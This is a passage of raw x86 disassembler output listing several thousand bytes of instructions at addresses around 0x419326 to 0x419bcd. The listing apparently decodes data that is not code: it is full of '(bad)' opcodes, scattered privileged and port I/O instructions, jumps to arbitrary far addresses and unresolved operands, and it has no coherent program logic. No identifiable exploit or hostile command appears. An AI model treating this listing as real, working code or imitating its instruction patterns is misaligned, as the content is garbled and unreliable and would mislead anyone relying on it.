  419326:	dec    edx
  419327:	mov    ebx,0x689fde8f
  41932c:	(bad)  
  41932d:	sub    BYTE PTR [edx],al
  41932f:	mov    al,0x94
  419331:	and    BYTE PTR [ebx-0x51],cl
  419334:	push   edx
  419335:	out    0x6d,al
  419337:	sar    BYTE PTR [esi-0x29a76cca],0x9d
  41933e:	fsub   DWORD PTR [ecx-0x78]
  419341:	cmp    BYTE PTR [edi+ebx*2],bh
  419344:	mov    ds:0x8e5871d7,eax
  419349:	cs out dx,al
  41934b:	out    0xb2,al
  41934d:	shl    BYTE PTR [eax+edx*4],1
  419350:	inc    ebx
  419351:	sbb    eax,0x39ec4ce5
  419356:	popf   
  419357:	jge    0x41935c
  419359:	sbb    eax,0x2ffaa929
  41935e:	stc    
  41935f:	imul   edi,DWORD PTR [ebx-0x44],0x5b
  419363:	in     eax,0xe5
  419365:	stc    
  419366:	dec    ecx
  419367:	xchg   ecx,eax
  419368:	push   es
  419369:	arpl   ax,sp
  41936b:	aaa    
  41936c:	adc    DWORD PTR [ebp+0x22dcd559],ecx
  419372:	pop    esp
  419373:	fsub   QWORD PTR [edx]
  419375:	inc    eax
  419376:	xor    al,0x39
  419378:	enter  0x743e,0xf9
  41937c:	shl    BYTE PTR [esi-0x7f],0xcb
  419380:	pop    edi
  419381:	push   es
  419382:	fmul   QWORD PTR [ebp+0x2e]
  419385:	ror    DWORD PTR [edi+0x3b22ec49],1
  41938b:	mov    DWORD PTR [ecx+0x6132bf18],esi
  419391:	xchg   ecx,eax
  419392:	(bad)  
  419394:	add    eax,0x54fe0079
  419399:	ds test eax,0x6de47815
  41939f:	retf   0x7775
  4193a2:	int    0x40
  4193a4:	xor    ecx,edi
  4193a6:	shr    BYTE PTR [edi],0xdc
  4193a9:	mov    bl,0xbb
  4193ab:	jmp    DWORD PTR [edi]
  4193ad:	fidiv  DWORD PTR [ecx-0x528bc076]
  4193b3:	jge    0x41938f
  4193b5:	mov    ch,0xdc
  4193b7:	push   ebx
  4193b8:	dec    edx
  4193b9:	mov    esp,0xadd99892
  4193be:	sbb    eax,0x45af3433
  4193c3:	adc    edx,DWORD PTR ds:0x6ce7abc0
  4193c9:	(bad)  
  4193ca:	test   DWORD PTR [ecx-0x3964126f],0x4cfe5fdd
  4193d4:	(bad)  
  4193d5:	dec    ebx
  4193d6:	mov    ebx,0x5585335f
  4193db:	push   edi
  4193dc:	cmp    ch,BYTE PTR [esi+edx*1+0x71fdedfe]
  4193e3:	push   es
  4193e4:	test   DWORD PTR [ecx-0xe],esp
  4193e7:	icebp  
  4193e8:	(bad)  
  4193e9:	loope  0x419430
  4193eb:	mov    BYTE PTR [edi+0x41],dh
  4193ee:	mov    ebp,DWORD PTR [eax+0x639f2586]
  4193f4:	call   0x880f5a4a
  4193f9:	inc    edi
  4193fa:	std    
  4193fb:	into   
  4193fc:	call   0x5e6753d7
  419401:	loop   0x4193c8
  419403:	neg    edi
  419405:	test   al,0xc1
  419407:	mov    ch,0xe6
  419409:	xchg   DWORD PTR [esi],esi
  41940b:	add    DWORD PTR ds:0xa91f98d8,0xffffffc9
  419412:	xchg   edi,eax
  419413:	enter  0xd8b,0x36
  419417:	lock in al,0x8a
  41941a:	inc    ebx
  41941b:	inc    ecx
  41941c:	dec    ecx
  41941d:	or     BYTE PTR [eax+0x42],cl
  419420:	pop    es
  419421:	xor    BYTE PTR [edx-0x20],0xf1
  419425:	pop    es
  419426:	aam    0xc9
  419428:	ret    0x7a88
  41942b:	sti    
  41942c:	pop    esi
  41942d:	sub    ebx,DWORD PTR [ecx+eiz*4+0x33577d68]
  419434:	adc    eax,0xa2242ce3
  419439:	cwde   
  41943a:	dec    ebx
  41943b:	shl    DWORD PTR [esi-0x2e],0xf3
  41943f:	leave  
  419440:	inc    edi
  419441:	mov    ds:0x250d8113,al
  419446:	pop    esi
  419447:	jae    0x4193cf
  419449:	hlt    
  41944a:	sub    eax,0x4843b260
  41944f:	mov    al,ds:0xa09fe248
  419454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419455:	popf   
  419456:	hlt    
  419457:	ds (bad) 
  419459:	je     0x419447
  41945b:	sub    cl,BYTE PTR [esp+edi*4+0x60786cd1]
  419462:	cdq    
  419463:	nop
  419464:	mov    ebp,0xca397beb
  419469:	or     eax,0x3c078dd5
  41946e:	sub    BYTE PTR [edx-0x71],ch
  419471:	mov    dl,0x61
  419473:	mov    eax,0xd06e9105
  419478:	and    eax,0x8a08d6ab
  41947d:	(bad)  
  41947e:	cdq    
  41947f:	mov    ds:0x5f6db0d6,al
  419484:	inc    edx
  419485:	imul   ecx,DWORD PTR [ebx-0x7bc0f59d],0xde22cfe2
  41948f:	fimul  WORD PTR ds:0x64ecc2d9
  419495:	call   0x0:0x652d
	...
  419514:	sbb    al,0x6c
  419516:	ins    DWORD PTR es:[edi],dx
  419517:	les    edi,FWORD PTR [ebp-0x3b]
  41951a:	mov    ebp,0x7e8bcdfc
  41951f:	jae    0x41957e
  419521:	out    dx,al
  419522:	inc    esp
  419523:	int    0xfd
  419525:	xor    eax,0x76c0001
  41952a:	add    BYTE PTR [eax],al
  41952c:	pop    ebp
  41952d:	add    al,bl
  41952f:	test   eax,0xe43f8d72
  419534:	adc    edi,DWORD PTR [ebx+ebx*8-0x71]
  419538:	jp     0x41958d
  41953a:	or     bh,cl
  41953c:	popa   
  41953d:	adc    eax,0x13394f00
  419542:	cwde   
  419543:	mov    dl,0x50
  419545:	sub    eax,DWORD PTR [edi+edx*4+0x1e]
  419549:	xlat   BYTE PTR ds:[ebx]
  41954a:	repz (bad) 
  41954c:	out    0xf8,eax
  41954e:	jmp    0x9da4:0xbba4a364
  419555:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419556:	aas    
  419557:	ds push edi
  419559:	push   ebp
  41955a:	into   
  41955b:	ss mov al,0x99
  41955e:	pop    ecx
  41955f:	fs retf 0x9430
  419563:	scas   al,BYTE PTR es:[edi]
  419564:	pop    es
  419565:	int3   
  419566:	xchg   edi,eax
  419567:	jmp    0x2e24ec1e
  41956c:	mov    cl,0x93
  41956e:	push   ebp
  41956f:	inc    eax
  419570:	icebp  
  419571:	(bad)  
  419572:	push   0x5f450ee
  419577:	inc    esi
  419578:	ja     0x4195c6
  41957a:	fs jle 0x41950e
  41957d:	iret   
  41957e:	retf   
  41957f:	add    bl,0xd2
  419582:	and    bl,ah
  419584:	sub    DWORD PTR [edx-0x4a68c3b2],edi
  41958a:	ret    0xf070
  41958d:	push   ebx
  41958e:	stos   BYTE PTR es:[edi],al
  41958f:	jo     0x419551
  419591:	or     eax,0x44f09e37
  419596:	rcr    dh,1
  419598:	popf   
  419599:	fstp   st(4)
  41959b:	push   ecx
  41959c:	and    dh,bh
  41959e:	repz repz jo 0x419555
  4195a2:	out    0xe0,eax
  4195a4:	mov    dh,0x63
  4195a6:	mov    ebp,0x6fdce6f
  4195ab:	jp     0x4195fa
  4195ad:	std    
  4195ae:	into   
  4195af:	mov    ch,0x3c
  4195b1:	and    eax,DWORD PTR [eax+edi*2-0x55]
  4195b5:	inc    esi
  4195b6:	out    dx,al
  4195b7:	repnz mov bh,0x3d
  4195ba:	mov    al,0x4e
  4195bc:	stos   BYTE PTR es:[edi],al
  4195bd:	(bad)  
  4195be:	(bad)  
  4195bf:	loop   0x4195a5
  4195c1:	arpl   WORD PTR [eax+eiz*1-0x1aac1b87],dx
  4195c8:	or     eax,0xa61bea89
  4195cd:	add    BYTE PTR [ebx+0x70],bh
  4195d0:	in     al,0x10
  4195d2:	sub    BYTE PTR [edx-0x1b],ch
  4195d5:	pop    ebp
  4195d6:	xchg   esp,eax
  4195d7:	ror    BYTE PTR [ebx-0x795bc359],0x88
  4195de:	sbb    BYTE PTR [ecx+0x7e],dh
  4195e1:	pop    esp
  4195e2:	es jno 0x419567
  4195e5:	out    dx,al
  4195e6:	inc    edx
  4195e7:	std    
  4195e8:	pop    ebx
  4195e9:	mov    ebx,DWORD PTR [esi+0x58ae6b87]
  4195ef:	cmp    BYTE PTR [edx],cl
  4195f1:	dec    ebx
  4195f2:	popa   
  4195f3:	cmp    al,BYTE PTR [ecx+edi*4+0x74518ed7]
  4195fa:	inc    ecx
  4195fb:	out    dx,eax
  4195fc:	pop    ds
  4195fd:	mov    ds:0xb2a9c923,ax
  419603:	mov    eax,ds:0xe6a1180e
  419608:	fadd   st(6),st
  41960a:	nop
  41960b:	inc    eax
  41960c:	adc    al,BYTE PTR [edi]
  41960e:	ret    
  41960f:	out    0xa2,eax
  419611:	sbb    DWORD PTR [esi+0x37eed5a0],ebx
  419617:	inc    ecx
  419618:	cwde   
  419619:	aam    0x5c
  41961b:	pushf  
  41961c:	sub    BYTE PTR [esi-0x26],ah
  41961f:	pop    es
  419620:	inc    ebx
  419621:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419622:	shl    ebp,0xbd
  419625:	retf   
  419626:	sbb    eax,0xb127724d
  41962b:	cmp    ah,BYTE PTR [ecx]
  41962d:	aas    
  41962e:	aaa    
  41962f:	xor    esp,ecx
  419631:	jb     0x4196a1
  419633:	rol    BYTE PTR ds:[edx-0x547f92ad],0x9d
  41963b:	dec    esp
  41963c:	int3   
  41963d:	sub    esp,DWORD PTR [edx+eiz*1]
  419640:	mov    ah,0x37
  419642:	xor    DWORD PTR [edx-0x7638d92],0x2a
  419649:	mov    edi,0x174f2df2
  41964e:	test   al,0x7c
  419650:	jmp    0x5fd2d63a
  419655:	ins    BYTE PTR es:[edi],dx
  419656:	or     dh,BYTE PTR [ebp-0x61b3ff57]
  41965c:	int3   
  41965d:	bound  esp,QWORD PTR [ebx]
  41965f:	fcomp  QWORD PTR [edi+eax*2]
  419662:	add    DWORD PTR [edx-0x66ea326a],ebx
  419668:	sar    DWORD PTR [esi-0x75d6d0c8],cl
  41966e:	inc    edi
  41966f:	test   DWORD PTR [edi+0x51],edi
  419672:	out    0xcd,al
  419674:	pop    ecx
  419675:	addr16 jmp 0xedf1cdbf
  41967b:	outs   dx,DWORD PTR ds:[esi]
  41967c:	lds    eax,FWORD PTR [ebp+0x48d5a99e]
  419682:	(bad)  
  419683:	out    dx,al
  419684:	fidivr WORD PTR [edx]
  419686:	retf   
  419687:	xchg   al,dh
  419689:	sub    al,0x16
  41968b:	adc    eax,DWORD PTR [ebx+0xe]
  41968e:	fisttp DWORD PTR [ebx-0x1c]
  419691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419692:	repz push es
  419694:	loop   0x41961f
  419696:	bound  ecx,QWORD PTR [esi+0x2262929c]
  41969c:	jg     0x4196ab
  41969e:	mov    bh,BYTE PTR [ebx]
  4196a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196a1:	jns    0x4196e1
  4196a3:	dec    esp
  4196a4:	cmp    DWORD PTR [eax],edi
  4196a6:	out    0xc8,eax
  4196a8:	cmp    DWORD PTR [esi+ebx*2+0x8bc241],edi
  4196af:	lods   al,BYTE PTR ds:[esi]
  4196b0:	out    dx,eax
  4196b1:	out    dx,eax
  4196b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196b3:	and    DWORD PTR [esi+0x56],ecx
  4196b6:	dec    ebp
  4196b7:	mov    eax,ds:0xa812612f
  4196bd:	mov    ds:0xce01b6fc,eax
  4196c2:	xchg   ebp,eax
  4196c3:	add    esp,0xffffffa3
  4196c6:	ret    
  4196c7:	mov    ebp,0xc5c086
  4196cc:	into   
  4196cd:	xor    al,0x5c
  4196cf:	lea    eax,[ecx-0x31a3f10f]
  4196d5:	fnstsw WORD PTR [eax-0x761916fa]
  4196db:	out    dx,eax
  4196dc:	int    0xf3
  4196de:	push   ss
  4196df:	lahf   
  4196e0:	pop    ebx
  4196e1:	addr16 das 
  4196e3:	mov    WORD PTR [ebp-0x61ee46ba],?
  4196e9:	cli    
  4196ea:	sub    dh,BYTE PTR [ecx]
  4196ec:	jp     0x41968d
  4196ee:	call   0x57d9a53
  4196f3:	stos   BYTE PTR es:[edi],al
  4196f4:	adc    DWORD PTR [edx-0x639471a1],eax
  4196fa:	xchg   ebx,eax
  4196fb:	stos   BYTE PTR es:[edi],al
  4196fc:	sub    al,bh
  4196fe:	inc    esp
  4196ff:	pop    ss
  419700:	ss jle 0x419720
  419703:	mov    esi,0x7a4a2b52
  419708:	dec    ebx
  419709:	mov    ah,0x3
  41970b:	inc    esi
  41970c:	adc    dl,BYTE PTR [eax-0x3b]
  41970f:	lock test eax,0xd9de18f3
  419715:	stos   BYTE PTR es:[edi],al
  419716:	mov    edi,0x11bc4911
  41971b:	and    BYTE PTR [edx-0x65],0xc8
  41971f:	sahf   
  419720:	cld    
  419721:	js     0x4196e0
  419723:	mov    edx,0x167f93f5
  419728:	fimul  DWORD PTR [ebx]
  41972a:	sub    BYTE PTR [ebp+ebp*2+0x32604aae],0x68
  419732:	loope  0x419744
  419734:	pop    es
  419735:	daa    
  419736:	clc    
  419737:	jno    0x4196fa
  419739:	push   ds
  41973a:	fist   WORD PTR [ebp+0x5e]
  41973d:	lods   eax,DWORD PTR ds:[esi]
  41973e:	dec    esi
  41973f:	popf   
  419740:	mov    esp,0x2ca4f036
  419745:	sub    DWORD PTR [eax-0x2e],edx
  419748:	aam    0xcd
  41974a:	hlt    
  41974b:	jns    0x41971b
  41974d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41974e:	sbb    ch,ah
  419750:	or     cl,BYTE PTR [edi]
  419752:	push   eax
  419753:	mov    bl,0xd4
  419755:	sbb    ebp,DWORD PTR [esi]
  419757:	jbe    0x41979a
  419759:	xchg   esi,eax
  41975a:	xchg   BYTE PTR [ebp+0xca798e],dh
  419760:	cmp    ebx,ebp
  419762:	dec    ecx
  419763:	shr    BYTE PTR [ecx+0x288d14a3],0x8c
  41976a:	pop    edi
  41976b:	nop
  41976c:	in     al,dx
  41976d:	mov    ds:0xe1e56d85,al
  419772:	test   cl,0x58
  419775:	mov    edx,0xad8eb05b
  41977a:	clc    
  41977b:	aad    0xaa
  41977d:	dec    ecx
  41977e:	test   al,al
  419780:	inc    edx
  419781:	or     al,0x5d
  419783:	and    BYTE PTR [eax+edi*8+0x253a7ae8],bl
  41978a:	pop    esi
  41978b:	in     al,0xb4
  41978d:	(bad)  
  41978e:	jne    0x4197a0
  419790:	push   0x6e
  419792:	adc    BYTE PTR [esi],cl
  419794:	imul   edi,DWORD PTR [edx-0x713ae0b6],0x7be708da
  41979e:	popa   
  41979f:	mov    bl,0x2e
  4197a1:	mov    esp,0xcb734064
  4197a6:	mov    al,ds:0x40343161
  4197ab:	xchg   DWORD PTR [ebp-0x5fc52fa1],ebx
  4197b1:	add    DWORD PTR [eax+ecx*1+0x8f7e77c],esi
  4197b8:	ror    DWORD PTR [edx-0x35ae7a5a],0x9
  4197bf:	unpcklps xmm5,XMMWORD PTR ss:[edi+ebp*4]
  4197c4:	mov    al,ds:0x7d0f7dad
  4197c9:	sbb    DWORD PTR [eax-0x357840a1],esp
  4197cf:	pop    ecx
  4197d0:	lods   eax,DWORD PTR ds:[esi]
  4197d1:	sbb    bl,0x85
  4197d4:	jns    0x41976f
  4197d6:	idiv   BYTE PTR [ebp+0x5b623f83]
  4197dc:	pusha  
  4197dd:	dec    ebp
  4197de:	nop
  4197df:	adc    cl,ch
  4197e1:	fsubr  QWORD PTR [ebx-0x5c9a604c]
  4197e7:	pop    edi
  4197e8:	push   0x3dcaff4e
  4197ed:	sti    
  4197ee:	pop    ss
  4197ef:	(bad)  
  4197f0:	in     al,0x78
  4197f2:	retf   
  4197f3:	xor    DWORD PTR [esi+0x3b],ecx
  4197f6:	in     al,0x3c
  4197f8:	xor    al,0x7
  4197fa:	call   0x79f5:0xf6b44bc3
  419801:	scas   al,BYTE PTR es:[edi]
  419802:	add    eax,0x34ba47b1
  419807:	in     eax,dx
  419808:	sbb    eax,0x9c01aec7
  41980d:	mov    ah,bl
  41980f:	sub    BYTE PTR [eax],0xd2
  419812:	add    edx,DWORD PTR [edx]
  419814:	pop    ebx
  419815:	and    eax,DWORD PTR [eax-0x104dbd26]
  41981b:	inc    esp
  41981c:	data16 and dh,BYTE PTR ss:[ecx+0x7cd09618]
  419824:	test   al,0xb
  419826:	mov    ds:0x7c60538f,al
  41982b:	fisub  DWORD PTR [ebx+0xf41966]
  419831:	xlat   BYTE PTR ds:[ebx]
  419832:	push   ecx
  419833:	mov    ch,0xed
  419835:	imul   eax,DWORD PTR [eax],0x16edee8a
  41983b:	and    DWORD PTR [ecx+0x594d3427],0xc3d705ef
  419845:	fwait
  419846:	inc    ebp
  419847:	dec    ebp
  419848:	mov    al,ds:0xe611b892
  41984d:	fbstp  TBYTE PTR [esi+0x698075c2]
  419853:	aaa    
  419854:	mov    edi,0xe9799d0b
  419859:	or     eax,0xf1d969b
  41985e:	gs adc BYTE PTR fs:[eax+0xb],ah
  419863:	push   es
  419864:	push   esp
  419865:	mov    dh,BYTE PTR [esp+eiz*4]
  419868:	dec    esi
  419869:	xchg   ebx,eax
  41986a:	(bad)  
  41986b:	ror    edi,cl
  41986d:	fst    DWORD PTR [ebx]
  41986f:	cs addr16 mov esp,0x408ace40
  419876:	(bad)  
  419877:	mov    ds:0xfaf3651b,al
  41987c:	ror    ecx,1
  41987e:	xchg   DWORD PTR [esi],esp
  419880:	and    DWORD PTR [eax-0x68fa6896],eax
  419886:	popf   
  419887:	pop    esp
  419888:	loopne 0x41988c
  41988a:	daa    
  41988b:	jecxz  0x419830
  41988d:	jmp    0x419822
  41988f:	fstp   QWORD PTR gs:[esi]
  419892:	jmp    DWORD PTR [edi+0x2b]
  419895:	push   ss
  419896:	xchg   esi,eax
  419897:	mov    ebp,0x1524cfa
  41989c:	xchg   ebx,eax
  41989d:	(bad)  
  41989e:	dec    ebx
  41989f:	push   edi
  4198a0:	mov    WORD PTR [ebp-0x26],?
  4198a3:	xchg   DWORD PTR [ebx+0x37f88b18],edi
  4198a9:	or     esi,ebp
  4198ab:	aam    0x73
  4198ad:	retf   0x9d16
  4198b0:	mov    bh,0x1d
  4198b2:	xchg   ecx,eax
  4198b3:	xchg   edx,eax
  4198b4:	jecxz  0x419915
  4198b6:	push   ecx
  4198b7:	rcr    BYTE PTR [ebx],0xc3
  4198ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198bb:	arpl   WORD PTR [edi-0x68f93b3f],si
  4198c1:	jmp    0x7ab56c02
  4198c6:	pop    eax
  4198c7:	ret    0x1078
  4198ca:	jmp    0x419947
  4198cc:	inc    eax
  4198ce:	arpl   WORD PTR [edx+esi*1],di
  4198d1:	lahf   
  4198d2:	lock adc al,0x7a
  4198d5:	or     ah,BYTE PTR [esi]
  4198d7:	nop    DWORD PTR [ebx-0x5cdc1852]
  4198de:	sbb    al,0x9a
  4198e0:	cdq    
  4198e1:	jnp    0x41986a
  4198e3:	loopne 0x4198ae
  4198e5:	xchg   esp,eax
  4198e6:	xchg   edi,eax
  4198e7:	inc    ebx
  4198e8:	fnstcw WORD PTR [ebx]
  4198ea:	xchg   BYTE PTR [ebp+ebp*4-0x18],dh
  4198ee:	fisub  DWORD PTR [edi-0x5d]
  4198f1:	gs dec esi
  4198f3:	pop    ss
  4198f4:	fwait
  4198f5:	pop    edx
  4198f6:	sub    DWORD PTR [ebx+edx*8],eax
  4198f9:	in     al,dx
  4198fa:	jae    0x419949
  4198fc:	cmc    
  4198fd:	fwait
  4198fe:	cmp    ebp,edi
  419900:	jo     0x419924
  419902:	gs (bad) 
  419905:	fs sahf 
  419907:	cmp    ah,dh
  419909:	push   esi
  41990a:	sbb    al,BYTE PTR [eax+edx*2-0x66b1a4e5]
  419911:	pop    esp
  419912:	xchg   ebx,eax
  419913:	inc    ebp
  419914:	push   eax
  419915:	ror    bl,cl
  419917:	mov    esi,0x9a76f5aa
  41991c:	lock mov ah,0x4f
  41991f:	fst    DWORD PTR [edi+0x67709424]
  419925:	(bad)  
  419926:	cmp    ah,BYTE PTR [edx]
  419928:	sbb    al,0x38
  41992a:	test   BYTE PTR [edx],bh
  41992c:	sbb    eax,DWORD PTR [edi]
  41992e:	cld    
  41992f:	js     0x419993
  419931:	mov    edi,0x4094ccfe
  419936:	ja     0x419901
  419938:	add    dh,BYTE PTR [edi-0x4c57834c]
  41993e:	xor    eax,0x744e63d9
  419943:	ss cdq 
  419945:	and    ebp,esi
  419947:	dec    ebp
  419948:	sub    al,0x30
  41994a:	jne    0x4199b1
  41994c:	push   ds
  41994d:	xor    bl,cl
  41994f:	clc    
  419950:	in     eax,dx
  419951:	adc    al,BYTE PTR [edx]
  419953:	pop    edi
  419954:	mov    al,0xc3
  419956:	jecxz  0x4198e4
  419958:	pop    ecx
  419959:	repnz pop esp
  41995b:	or     DWORD PTR [esi-0x75],0x663ce9e2
  419962:	pop    ds
  419963:	mov    al,ds:0xc7815198
  419968:	(bad)  
  419969:	adc    al,0x40
  41996b:	dec    ebx
  41996c:	dec    edi
  41996d:	and    esi,DWORD PTR [edx-0x66]
  419970:	or     eax,0xa3fe83d4
  419976:	or     eax,0xab02c21c
  41997b:	mov    ebp,0xe304e30c
  419980:	test   al,0x96
  419982:	int3   
  419983:	jns    0x41992f
  419985:	push   eax
  419986:	or     al,0xf6
  419988:	cld    
  419989:	repz ret 0xcaa7
  41998d:	push   eax
  41998e:	or     eax,0x9479f2e4
  419993:	sti    
  419994:	mov    ebx,0xea902a74
  419999:	loopne 0x419943
  41999b:	xor    eax,0x7929fc7f
  4199a0:	enter  0xf67e,0x58
  4199a4:	jne    0x419930
  4199a6:	jmp    0xb5a0:0xd3391afe
  4199ad:	pop    es
  4199ae:	gs push 0xb4ae80ae
  4199b4:	push   ds
  4199b5:	mov    esi,0x15a31e35
  4199ba:	jp     0x4199b1
  4199bc:	int    0x1
  4199be:	pop    eax
  4199bf:	je     0x419960
  4199c1:	push   edx
  4199c2:	add    DWORD PTR [ebp+0x65517c61],esi
  4199c8:	rcr    DWORD PTR [esi-0x8],1
  4199cb:	xchg   edx,eax
  4199cc:	mov    gs,WORD PTR ds:0x9f0fff00
  4199d2:	jnp    0x419973
  4199d4:	(bad)  
  4199d5:	data16 and dl,cl
  4199d8:	ja     0x419980
  4199da:	call   0x8996b4d4
  4199df:	out    dx,eax
  4199e0:	cdq    
  4199e1:	or     DWORD PTR ds:0x976d19a8,ebp
  4199e7:	mov    esi,DWORD PTR [ebx]
  4199e9:	aam    0x4c
  4199eb:	loopne 0x419a62
  4199ed:	ficom  WORD PTR [ebp-0x7cd47e22]
  4199f3:	mov    bh,0x5d
  4199f5:	adc    bh,al
  4199f7:	push   edx
  4199f8:	(bad)  
  4199f9:	pop    ebx
  4199fa:	pop    ss
  4199fb:	retf   0xfb99
  4199fe:	aam    0x21
  419a00:	pop    esp
  419a01:	ror    DWORD PTR [ecx],cl
  419a03:	jbe    0x419a5f
  419a05:	pop    edx
  419a06:	in     al,dx
  419a07:	jbe    0x4199d0
  419a09:	aad    0x87
  419a0b:	pop    es
  419a0c:	dec    eax
  419a0d:	in     eax,dx
  419a0e:	call   0x5eaea3ed
  419a13:	or     al,0xd
  419a15:	out    0x85,eax
  419a17:	(bad)  
  419a18:	cmp    al,0xf7
  419a1a:	push   edx
  419a1b:	inc    edx
  419a1c:	jmp    0xa54e:0xdd834cd5
  419a23:	pop    esp
  419a24:	(bad)  
  419a25:	loope  0x4199ec
  419a27:	dec    edx
  419a28:	xor    esp,ebx
  419a2a:	mov    ah,dh
  419a2c:	adc    cl,BYTE PTR [edx-0x5bd6cd8a]
  419a32:	lock cmp eax,0x10f8df8c
  419a38:	or     eax,esp
  419a3a:	mov    bh,0x3c
  419a3c:	pushf  
  419a3d:	mov    esp,0x9a4631ce
  419a42:	mov    ds:0xc4a21371,eax
  419a47:	test   al,0x79
  419a49:	dec    esp
  419a4a:	(bad)  
  419a4b:	in     al,0x94
  419a4d:	pop    edx
  419a4e:	sahf   
  419a4f:	xor    BYTE PTR [ebx],ch
  419a51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a52:	loope  0x419a52
  419a54:	lds    eax,FWORD PTR [edx-0x15]
  419a57:	hlt    
  419a58:	cmc    
  419a59:	jmp    0x4a2e3fe8
  419a5e:	enter  0x9413,0x17
  419a62:	sbb    dl,BYTE PTR [ebx-0x756d854e]
  419a68:	sbb    eax,0x76eece44
  419a6d:	mov    eax,ds:0x617691bd
  419a72:	ror    BYTE PTR [eax],1
  419a74:	mov    ecx,0x6c461174
  419a79:	mov    eax,ds:0xb39eaec
  419a7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a7f:	ja     0x419acb
  419a81:	mov    dh,0x44
  419a83:	int    0xa8
  419a85:	pop    ebp
  419a86:	mov    cl,0x19
  419a88:	inc    ecx
  419a89:	cmp    bh,dl
  419a8b:	mov    ebx,0x15c6615f
  419a90:	inc    ebx
  419a91:	test   BYTE PTR [ebp-0x49],dl
  419a94:	cmp    eax,DWORD PTR [ebp-0x1b75c373]
  419a9a:	and    DWORD PTR ds:0x8d4c86f3,edi
  419aa0:	cld    
  419aa1:	pop    ss
  419aa2:	into   
  419aa3:	inc    edx
  419aa4:	ret    0x6097
  419aa7:	ret    0x3f64
  419aaa:	fsub   st,st(6)
  419aac:	sbb    BYTE PTR [edx-0x1d],ah
  419aaf:	cmp    BYTE PTR [esi-0x54],0x0
  419ab3:	sbb    DWORD PTR [ecx-0x3f],esp
  419ab6:	push   ss
  419ab7:	mov    edx,0x1ea757fc
  419abc:	ror    DWORD PTR [ebx],0x9f
  419abf:	jecxz  0x419a6f
  419ac1:	pop    ecx
  419ac2:	imul   ebp,DWORD PTR [ebp+0x75],0xd
  419ac6:	cwde   
  419ac7:	xchg   ebx,eax
  419ac8:	adc    eax,DWORD PTR [ebx+esi*2+0xc06b95b]
  419acf:	loop   0x419b0d
  419ad1:	mov    eax,0xa44394f3
  419ad6:	or     esi,edx
  419ad8:	dec    edi
  419ad9:	mov    dh,0x1
  419adb:	(bad)  
  419add:	lods   al,BYTE PTR ds:[esi]
  419ade:	nop
  419adf:	dec    ebp
  419ae0:	sub    al,BYTE PTR [edi-0x37]
  419ae3:	shl    BYTE PTR [eax+0x1863eb3],cl
  419ae9:	jae    0x419b26
  419aeb:	xor    al,0xf0
  419aed:	mov    edi,0x7905378f
  419af2:	jge    0x419b35
  419af4:	jle    0x419b61
  419af6:	loop   0x419a8f
  419af8:	lds    ecx,FWORD PTR [eax+0x4c]
  419afb:	stos   DWORD PTR es:[edi],eax
  419afc:	or     ecx,0xfffffffe
  419aff:	mov    BYTE PTR [edi+0x7ab85fc4],bl
  419b05:	cmc    
  419b06:	stos   DWORD PTR es:[edi],eax
  419b07:	jmp    0xacb1920d
  419b0c:	mov    bl,0xb2
  419b0e:	push   eax
  419b0f:	pop    ecx
  419b10:	add    cl,BYTE PTR [edx]
  419b12:	push   esp
  419b13:	inc    edi
  419b14:	or     ch,BYTE PTR [edi]
  419b16:	pushf  
  419b17:	xlat   BYTE PTR ds:[ebx]
  419b18:	lods   eax,DWORD PTR ds:[esi]
  419b19:	dec    esi
  419b1a:	cmp    eax,0x775d701
  419b1f:	push   0xf7ec9eed
  419b24:	push   edi
  419b25:	and    esp,DWORD PTR [ecx-0x30]
  419b28:	mov    bl,0x3a
  419b2a:	dec    edx
  419b2b:	jecxz  0x419ac3
  419b2d:	in     al,dx
  419b2e:	imul   eax,DWORD PTR ss:[edi-0x4e],0x149a65e3
  419b36:	fdivp  st(5),st
  419b38:	jp     0x419acd
  419b3a:	popa   
  419b3b:	int3   
  419b3c:	inc    eax
  419b3d:	xor    DWORD PTR [edx+0x7d],eax
  419b40:	es cwde 
  419b42:	repz out 0x42,al
  419b45:	pop    ss
  419b46:	fst    QWORD PTR [edi-0xeb7ab8]
  419b4c:	add    DWORD PTR [ecx+0x7c2a477b],edi
  419b52:	push   esi
  419b53:	push   es
  419b54:	sub    ecx,DWORD PTR [ebp+0x28bb9973]
  419b5a:	aad    0x76
  419b5c:	mov    ah,0x38
  419b5e:	adc    DWORD PTR [eax],0x55a26637
  419b64:	loop   0x419aff
  419b66:	pop    edi
  419b67:	fisttp DWORD PTR [ebx+0x6fd6a17e]
  419b6d:	pop    esp
  419b6e:	and    cl,BYTE PTR [esi+edx*2+0x12]
  419b72:	mov    DWORD PTR [esi+eax*8],0x196f640
  419b79:	push   0x96d55ce3
  419b7e:	fstp   DWORD PTR [ecx]
  419b80:	and    BYTE PTR [eax+0x14],cl
  419b83:	daa    
  419b84:	sbb    eax,0x1c9fcc93
  419b89:	jl     0x419bb8
  419b8b:	push   esi
  419b8c:	cmp    al,0x21
  419b8e:	ret    0x6526
  419b91:	imul   esp,DWORD PTR [eax],0xffffffbc
  419b94:	enter  0xe815,0xa1
  419b98:	sub    ebx,ebx
  419b9a:	mov    al,0x43
  419b9c:	push   0x7
  419b9e:	neg    BYTE PTR [edi-0x28]
  419ba1:	popf   
  419ba2:	fisttp QWORD PTR [edi+0x2d5cb323]
  419ba8:	xor    ecx,edx
  419baa:	ja     0x419b70
  419bac:	retf   0x4f9e
  419baf:	std    
  419bb0:	ja     0x419c1e
  419bb2:	ins    DWORD PTR es:[edi],dx
  419bb3:	mov    ecx,DWORD PTR [esi-0x63]
  419bb6:	xchg   edx,eax
  419bb7:	cmp    ch,dl
  419bb9:	addr16 mov edx,0xa94a5eee
  419bbf:	sti    
  419bc0:	je     0x419bae
  419bc2:	dec    ebx
  419bc3:	pop    ds
  419bc4:	ret    0xf5c1
  419bc7:	jnp    0x419b71
  419bc9:	pop    es
  419bca:	dec    edi
  419bcb:	xor    al,0x1c
  419bcd:	jle    0x419b52
